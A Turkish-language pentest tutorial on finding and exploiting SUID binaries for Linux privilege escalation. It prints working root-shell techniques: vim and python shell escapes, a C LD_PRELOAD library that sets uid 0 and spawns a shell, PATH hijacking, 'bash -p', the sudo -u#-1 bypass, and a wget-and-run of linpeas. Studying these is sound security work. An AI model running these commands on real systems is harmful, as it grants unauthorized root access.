# SUID Zafiyetlerinin Tespit ve Sömürülmesi

Bu rehberde, SUID (Set Owner User ID) bayrağına sahip dosyaların tespit edilmesi, sömürülmesi ve olası zafiyetlerin nasıl değerlendirileceği en ince detayına kadar anlatılmaktadır. Rehber, araçlar, komutlar, yöntemler ve özel ipuçları içermektedir.

---

## SUID Nedir?

SUID, bir dosya üzerinde `setuid` bitinin etkin olduğu anlamına gelir. Bu bit, dosyanın çalıştırıldığı kullanıcı yerine dosyanın sahibinin yetkileriyle çalışmasını sağlar. SUID, yanlış yapılandırıldığında veya güvenliği zayıf uygulamalarla kullanıldığında bir saldırı yüzeyi oluşturabilir.

---

## SUID Dosyalarının Tespiti

### Tespit Komutları

#### Yalnızca SUID Bayrağına Sahip Dosyaları Bulmak
```bash
find / -perm -u=s -type f 2>/dev/null
```

#### Belirli Kullanıcılara Ait SUID Dosyalarını Bulmak
```bash
find / -user <kullanıcı_adı> -perm -4000 -type f 2>/dev/null
```

#### Hedef Dizinde SUID Dosyalarını Aramak
```bash
find <dizin> -perm -u=s -type f 2>/dev/null
```

#### SUID Dosyalarını Listeleyip Ayrıntılı Bilgi Almak
```bash
ls -l $(find / -perm -u=s -type f 2>/dev/null)
```

---

## SUID Dosyalarının Analizi

### Dosya Sahibi ve Grup Bilgisi
```bash
ls -l <dosya_adı>
```

### Dosya Tipini Belirleme
```bash
file <dosya_adı>
```

### Dosyada Statik Analiz
```bash
strings <dosya_adı>
```

### Bağımlılık Analizi
```bash
ldd <dosya_adı>
```

---

## SUID Dosyalarının Sömürülmesi

### Genel Adımlar
1. **SUID Dosyasının Yetkisini İnceleyin:** Dosyanın hangi kullanıcının yetkisiyle çalıştığını belirleyin.
2. **SUID Dosyasını Çalıştırın:** Dosyanın beklenmedik bir davranış sergileyip sergilemediğini gözlemleyin.
3. **İstismar Edilebilirlik Araştırması Yapın:** Dosyanın güvenlik zafiyetlerini araştırın.

---

### Sömürü Teknikleri

#### 1. Shell Elde Etme

Belirli dosyalar, shell elde etmek için doğrudan kullanılabilir. Örneğin:

##### `vim` ile Root Shell
```bash
vim -c '!sh'
```

##### `python` ile Shell
```bash
python -c 'import os; os.system("/bin/sh")'
```

#### 2. Çevrimdışı Analiz ile Exploit
SUID dosyasını kopyalayarak analiz etmek:
```bash
cp <suid_dosya> /tmp/
chmod +x /tmp/<suid_dosya>
./<suid_dosya>
```

#### 3. Ortam Değişkenlerinden Yararlanma
SUID dosyası ortam değişkenlerine bağımlıysa, manipüle edilerek exploit edilebilir. Örneğin:

##### `LD_PRELOAD` Yöntemi
```bash
cat > /tmp/exploit.c << EOF
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/sh");
}
EOF

gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
LD_PRELOAD=/tmp/exploit.so <suid_dosya>
```

#### 4. Hardcoded Komutlardan Yararlanma
SUID dosyasında hardcoded bir komut varsa, PATH değişkeni değiştirilerek exploit edilebilir:
```bash
export PATH=/tmp:$PATH
echo "/bin/sh" > /tmp/ls
chmod +x /tmp/ls
<suid_dosya>
```

---

## Faydalı Araçlar

### `GTFOBins`
SUID exploitlerinde sıklıkla başvurulan bir araçtır.
- [GTFOBins Websitesi](https://gtfobins.github.io/)

### `linPEAS`
Linux makinelerde yetki yükseltme zafiyetlerini tespit etmek için kullanılır.
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

## İpuçları ve Yöntemler

1. **Zayıf Kod Kontrolü:** SUID dosyasındaki kod açıklarını inceleyin.
2. **Yetki Zinciri Analizi:** Dosyanın zincirleme olarak başka zafiyetlere yol açıp açmadığını araştırın.
3. **Deneme Yanılma:** Dosyayı farklı parametrelerle çalıştırarak beklenmedik davranışları gözlemleyin.
4. **Dokümantasyon ve Bloglar:** İlgili uygulamalarla alakalı blog yazılarını ve dokümantasyonları okuyun.

---

## Sık Karşılaşılan SUID Dosyaları ve Exploit Örnekleri

### `/bin/bash`
```bash
/bin/bash -p
```

### `/usr/bin/sudo`
```bash
sudo -u#-1 /bin/bash
```

### `/usr/bin/env`
```bash
/usr/bin/env /bin/sh
```

---

## Notlar
- SUID zafiyetlerinin istismarı etik kurallara uygun şekilde yapılmalıdır.
- Test ortamlarında uygulamalar yapılmalıdır.

---

Bu rehber düzenli olarak güncellenecektir. Öneriler ve geri bildirimler için iletişime geçebilirsiniz.
